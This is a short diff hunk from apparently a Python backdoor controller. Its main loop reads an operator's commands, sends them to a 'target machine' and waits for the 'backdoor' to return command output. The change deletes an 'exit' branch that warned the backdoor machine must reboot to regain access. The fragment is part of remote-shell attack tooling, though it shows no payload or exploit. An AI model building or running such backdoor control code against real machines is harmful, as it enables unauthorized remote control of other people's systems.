@@ -27,10 +27,6 @@ def main():
                 # get user command and send to target machine
                 user_input = input()
                 client_socket.send(user_input)
-                if (user_input.strip() == 'exit'):
-                    print('closing remote shell (backdoor machine must reboot to regain access)')
-                    break
-                
 
                 # wait for backdoor to send command output
                 command_output = client_socket.receive()
